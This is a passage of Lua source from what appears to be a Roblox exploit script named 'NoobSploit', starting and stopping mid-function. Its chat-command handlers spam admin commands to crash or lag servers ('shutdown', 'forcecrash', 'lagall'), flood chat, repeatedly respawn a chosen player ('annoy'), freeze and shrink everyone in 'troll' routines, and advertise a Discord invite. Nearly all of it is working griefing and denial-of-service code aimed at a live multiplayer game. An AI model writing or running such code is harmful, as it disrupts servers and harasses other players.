					if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
						local v8 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Bright red"))
							}
						remote:InvokeServer(v1, v8)
					end

					if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
						local v9 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark orange"))
							}
						remote:InvokeServer(v1, v9)
					end

					if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
						local v10 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
							}
						remote:InvokeServer(v1, v10)
					end

					if v.Name == "SmoothBlockModel112" then
						local v11 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Medium blue"))
							}
						remote:InvokeServer(v1, v11)
					end

					if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
						local v12 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Reddish brown"))
							}
						remote:InvokeServer(v1, v12)
					end

					if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
						local v13 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Sand red"))
							}
						remote:InvokeServer(v1, v13)
					end
				end)
			end
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetDescendants()) do
			if v:IsA("Part") then
				spawn(function()
					if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
						local v14 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
							}
						remote:InvokeServer(v1, v14)
					end

					if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
						local v15 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Deep blue"))
							}
						remote:InvokeServer(v1, v15)
					end

					if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
						local v16 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Institutuional white"))
							}
						remote:InvokeServer(v1, v16)
					end

					if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part5" or v.Name == "Part9" then
						local v17 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Lime green"))
							}
						remote:InvokeServer(v1, v17)
					end

					if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" or v.Name == "Part38" or v.Name == "Part5" or v.Name == "Part9" then
						local v18 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Medium Stone grey"))
							}
						remote:InvokeServer(v1, v18)
					end

					if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
						local v19 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("New yeller"))
							}
						remote:InvokeServer(v1, v19)
					end

					if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
						local v20 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Really black"))
							}
						remote:InvokeServer(v1, v20)
					end

					if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
						local v21 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Really red"))
							}
						remote:InvokeServer(v1, v21)
					end

					if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
						local v22 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Toothpaste"))
							}
						remote:InvokeServer(v1, v22)
					end
				end)
			end
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v23 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Really red"))
						}
					remote:InvokeServer(v1, v23)
				end

				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
					if v:IsA("Part") then
						local v24 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Teal"))
							}
						remote:InvokeServer(v1, v24)
					end
				end
			end)
		end
	elseif string.sub(msg:lower(), 0, 6) == prefix.."fixbp" then
		local plr = string.sub(msg:lower(), 8)
		game.Players:Chat(prefix.."trap "..plr)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500.99981689453, 0.10156404972076, 0))
		wait(0.10)
		game.Players:Chat("jail me")
		game.Players:Chat("tp "..plr.." me")
		wait(0.25)

		local target = Workspace_Folder.Baseplate
		function movepart()
			local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
			local looping = true
			spawn(function()
				while true do
					game:GetService('RunService').Heartbeat:Wait()
					game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
					cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
					if not looping then break end
				end
			end)
			spawn(function() while looping do wait(.1) game.Players:Chat('unpunish me') end end)
			wait(0.25)
			looping = false
		end
		movepart()
		wait(0.75)

		game.Players:Chat("tp me "..plr)
	elseif string.sub(msg:lower(), 0, 7) == prefix.."padban" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 9)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				table.insert(Pad_Ban, v.Name)
				logn("Banned "..v.Name.." from pads.")
			end
		end
	elseif string.sub(msg:lower(), 0, 9) == prefix.."unpadban" then
		names = game.Players:GetChildren()
		local name = string.sub(msg:lower(), 11)
		for i,v in pairs(names) do
			strlower = string.lower(v.Name)
			sub = string.sub(strlower,1,#name)
			if name == sub then
				user = v.Name
				for a,b in pairs(Pad_Ban) do
					if b == v.Name then
						table.remove(Pad_Ban, a)
						logn("Unbanned "..v.Name.." from pads.")
					end
				end
			end
		end
	end -- table.remove(list1, i)

	if string.sub(msg:lower(), 0, 5) == prefix.."perm" then
		PadCheck = true
		GetPad(msg)
	elseif string.sub(msg:lower(), 0, 8) == prefix.."nonperm" then
		PadCheck = false
	elseif string.sub(msg:lower(), 0, 8) == prefix.."infjump" then
		InfiniteJumpEnabled = true
		game:GetService("UserInputService").JumpRequest:connect(function()
			if InfiniteJumpEnabled then
				game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
			end
		end)
	elseif string.sub(msg:lower(), 0, 7) == prefix.."attach" then
		game.Players:Chat("stun me")
		wait(2.4)
		game.Players:Chat("punish me")
		wait(1.7)
		game.Players:Chat("unpunish me")
		logn("Attached to part")
	elseif string.sub(msg:lower(), 0, 5) == prefix.."stop" then
		logn("Stopped spamming")
		Wteskking = "none"
		Wwkicking = "none"
		wkicking = false
		spamming = false
		crashall = false
		vis = false
		rfog = false
	elseif string.sub(msg:lower(), 0, 10) == prefix.."clearlogs" then
		logn("Cleared!")
		for i = 1,100 do
			game.Players:Chat("ff "..Quotes[math.random(1, #Quotes)])
			game.Players:Chat("unff all")
		end
		wait(0.05)
		if allowads == true then
			game.Players:Chat("ff Powered by NoobSploit")
			game.Players:Chat("ff I A Noob Is Better Than You")
			game.Players:Chat("unff all")
		end
		repeat wait() until game:IsLoaded()
		--
	elseif string.sub(msg:lower(), 0, 4 ) == prefix.."25 " then
		logn("Spamming!")
		for i = 1,25 do
			game.Players:Chat(string.sub(msg:lower(), 5))
		end
	elseif string.sub(msg:lower(), 0, 7) == prefix.."super " then
		logn("Spamming!")
		for i = 1,250 do
			game.Players:Chat(string.sub(msg:lower(), 8))
		end
	elseif string.sub(msg:lower(), 0, 5) == prefix.."420 " then
		logn("Spamming!")
		for i = 1,420 do
			game.Players:Chat(string.sub(msg:lower(), 6))
		end
	elseif string.sub(msg:lower(), 0, 6) == prefix.."spam " then
		logn("Spamming!")
		Wspamming = string.sub(msg:lower(), 7)
		spamming = true
	elseif string.sub(msg:lower(), 0, 7) == prefix.."lagall" then
		logn("Warning! This Can Only Be Targeted At Everyone So Be Careful, Its Quite Dangerous...")
		crashall = true
		game.Players:Chat(prefix.."spam h UHWEHIEWFIUWIEGFGIYFGIFIEGWIGFEWFWEUIEFUIFEWUBIVBUIEVIUEWFIEUGGEFIUGIWIGUGIUVEGGEFWIUGUFIGUFWFGIEFWEFIGWEFUEUGGIGIWEGEFUGEWGUWEGUFEWUIGEFUGEUFWFEIFEUWIUEGFWGUEWFIGUWFIWEFUGFEWIGUUEGFWUFWUHIEFWIUFEWIUEFWHFEWIIHEFWHIFEWHEWHEWHIWHEIEFWHIUWIHWEFWIEWHEFIIUHEIIHEWIEWIHEFWIHEFWHIFEWHWEFIHHIEFWEIHEFWHWHUEWHFHQEHOQEHIOFIHOOHFWEUOHEWHOEFWHOWEHOEOWIHOIFHIOWEOHOWEFOEWUHEWFUHEQUFEQOQEOHQEA")
	elseif string.sub(msg:lower(), 0, 10) == prefix.."pads" then
		logn("Teleported to the pads!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-32.7, 8.22999954, 94.5))
	elseif string.sub(msg:lower(), 0, 8) == prefix.."skydive" then
		logn("Skydived!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 1500, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z))
	elseif string.sub(msg:lower(), 0, 6) == prefix.."house" then
		logn("Teleported to the house!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
	elseif string.sub(msg:lower(), 0, 6) == prefix.."spawn" then
		logn("Teleported to pads!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-41, 3.7, -15.589996337891))
	elseif string.sub(msg:lower(), 0, 4) == prefix.."reg" then
		logn("Pads regenerated!")
		regen()
	elseif string.sub(msg:lower(), 0, 8) == prefix.."prefix " then
		logn("WARNING: THIS DISABLES THE GUI BUTTONS!")
		logn("Changed prefix to '"..string.sub(msg:lower(), 9, 9).."'")
		uidata.prefix = string.sub(msg:lower(), 9, 9)
		TextBox_3.Text = uidata.prefix
		prefix = string.sub(msg:lower(), 9, 9)
		updatefile()
	elseif string.sub(msg:lower(), 0, 5) == prefix.."alog" then
setclipboard(game.workspace.Terrain._Game.Folder.Sound.SoundId)
	elseif string.sub(msg:lower(), 0, 9) == prefix.."shutdown" then
		logn("Server is dead enjoy")
		wait(0.5)
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
	elseif string.sub(msg:lower(), 0, 9) == prefix.."rfog on" then
		game.Players:Chat("fogend 100")
		rfog = true
			while rfog == true do 
				game.Players:Chat("fogcolor 255 0 0")
				wait(0.1)
				game.Players:Chat("fogcolor 255 165 0")
				wait(0.1)
				game.Players:Chat("fogcolor 255 185 0")
				wait(0.1)
				game.Players:Chat("fogcolor 255 200 0")
				wait(0.1)
				game.Players:Chat("fogcolor 255 227.5 0")
				wait(0.1)
				game.Players:Chat("fogcolor 255 255 0")
				wait(0.1)
				game.Players:Chat("fogcolor 175 225 0")
				wait(0.1)
				game.Players:Chat("fogcolor 100 175 0")
				wait(0.1)
				game.Players:Chat("fogcolor 50 140 0")
				wait(0.1)
				game.Players:Chat("fogcolor 0 128 0")
				wait(0.1)
				game.Players:Chat("fogcolor 0 75 100")
				wait(0.1)
				game.Players:Chat("fogcolor 0 50 200")
				wait(0.1)
				game.Players:Chat("fogcolor 0 25 230")
				wait(0.1)
				game.Players:Chat("fogcolor 0 0 255")
				wait(0.1)
				game.Players:Chat("fogcolor 15 0 230")
				wait(0.1)
				game.Players:Chat("fogcolor 30 0 175")
				wait(0.1)
				game.Players:Chat("fogcolor 50 0 145")
				wait(0.1)
				game.Players:Chat("fogcolor 75 0 130")
				wait(0.1)
				game.Players:Chat("fogcolor 120 25 145")
				wait(0.1)
				game.Players:Chat("fogcolor 165 50 175")
				wait(0.1)
				game.Players:Chat("fogcolor 185 75 195")
				wait(0.1)
				game.Players:Chat("fogcolor 238 130 238")
				wait(0.1)
				game.Players:Chat("fogcolor 240 75 120")
				wait(0.1)
				game.Players:Chat("fogcolor 240 55 25")
				wait(0.1)
				game.Players:Chat("fogcolor 250 20 15")
				wait(0.1)
			end
	elseif string.sub(msg:lower(), 0, 5) == prefix.."cmds" then
		local GC = getconnections or get_signal_cons
		local Bpath = game:GetService("Players").LocalPlayer.PlayerGui.Noobsploit.Topbar.Corner.Main.Tablist.Tablist.CommandsBtn
		
		for i,v in pairs(GC(Bpath.MouseButton1Click)) do
			v:Fire()
		end
		for i,v in pairs(GC(Bpath.MouseButton1Down)) do
			v:Fire()
		end
	elseif string.sub(msg:lower(), 0, 10) == prefix.."rfog off" then
		rfog = false
	elseif string.sub(msg:lower(), 0, 13) == prefix.."antiabuse on" then
		antiabuse = true
	elseif string.sub(msg:lower(), 0, 8) == prefix.."vis on" then
		vis = true
			if not game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
		logn("Visualizer has been disabled due to no music being played")
		   vis = false
	   else
		   while vis == true do
			local eee = game.Workspace.Terrain["_Game"].Folder.Sound.PlaybackLoudness
			   wait(0.05)
			   game.Players:Chat("fogend "..eee)
		   end
	   end
   end
	if string.sub(msg:lower(), 0, 8) == prefix.."vis off" then
		vis = false
	elseif string.sub(msg:lower(), 0, 7) == prefix.."theme1" then
		game.Players:Chat("fix")
		wait(0.1)
		game.Players:Chat("time 4")
		game.Players:Chat("outdoorambient 000 000 111")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."theme2" then
		game.Players:Chat("fix")
		wait(0.1)
		game.Players:Chat("fogend 0000000000000000000100")
		game.Players:Chat("fogcolor 0000000000000000250 0 500")
	elseif string.sub(msg:lower(), 0, 8) == prefix.."coconut" then
		game.Players:Chat("music 649734792")
		game.Players:Chat("char all 5")
		game.Players:Chat("paint all brown")
		game.Players:Chat("size all .3")
		game.Players:Chat("size all .3")
		game.Players:Chat("size all .3")
		game.Players:Chat("size all .3")
		game.Players:Chat("size all .3")
		game.Players:Chat("unsize all")
		game.Players:Chat("size all 2")
		game.Players:Chat("name all COCONUT")
		wait(0.3)
		game.Players:Chat("paint all brown")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."glitch" then
		local player = string.sub(msg:lower(), 7)

		game.Players:Chat("gear me 71037101")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.DaggerOfShatteredDimensions)
		game.Players:Chat("god "..player)
		game.Players:Chat("tp "..player.." me")
		game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.Q,false,game)
		wait(2)
		game.Players:Chat("reset me")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."check" then
		AntiGear = false
		game.Players:Chat("gear me 000000000000000000094794847")
		wait(0.2)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.VampireVanquisher)
		wait(0.5)
		game.Players:Chat("removetools me")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."dcrash" then
		game.Players:Chat("h gg/PATnxvQ9Se")
		wait(1)
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("removeclones")
		game.Players:Chat("respawn all")
	elseif string.sub(msg:lower(), 0, 7) == prefix.."fcrash" then
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("removeclones")
		game.Players:Chat("respawn all")
	elseif string.sub(msg:lower(), 0, 6) == prefix.."annoy" then
		if string.sub(msg:lower(), 0, 6) == prefix.."annoy" then
			local player = string.sub(msg:lower(), 7)
			game.Players:Chat("respawn "..player.."")
			game.Players:Chat(prefix.."spam respawn "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." "..player.." ")
		end
	elseif string.sub(msg:lower(), 0, 15) == prefix.."devcommandfuck" then
		logn("shut up fucker")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X + -7, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 78009, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z + 95))
	elseif string.sub(msg:lower(), 0, 4) == prefix.."fix" then
		local light = game:GetService("Lighting")
		for i, v in pairs(light:GetChildren()) do
			v:Destroy()
		end
		game.Lighting.FogEnd = 9e9
	elseif string.sub(msg:lower(), 0, 6) == prefix.."troll" then
		logn("Succsessfully Trolled The Server! :D")
		game.Players:Chat("fix")
		game.Players:Chat(prefix.."sm Do a little trolling Make sure to follow EGGLNQ on Roblox")
		wait(0.3)
		game.Players:Chat(prefix.."dark")
		game.Players:Chat("disco")
		game.Players:Chat("fogend")
		game.Players:Chat("stun all")
		game.Players:Chat("unsize all")
		wait(0.03)
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get Trolled","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You ask Why Me?","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("The Anwser is You arnt Trolling","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You Mad Because You Got Trolled?","All")
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Go On Join I'll listen And Get The Script There gg/PATnxvQ9Se","All")
		game.Players:Chat(":music 229681899")
		wait(0.8)
		game.Players:Chat("m/Get Trolled!")
		wait(0.3) 
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
	elseif string.sub(msg:lower(), 0, 11) == prefix.."forcecrash" then
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("size all 0.3")
		game.Players:Chat("freeze all")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("size all 10")
		game.Players:Chat("clone all")
	elseif string.sub(msg:lower(), 0, 4) == prefix.."bts" then
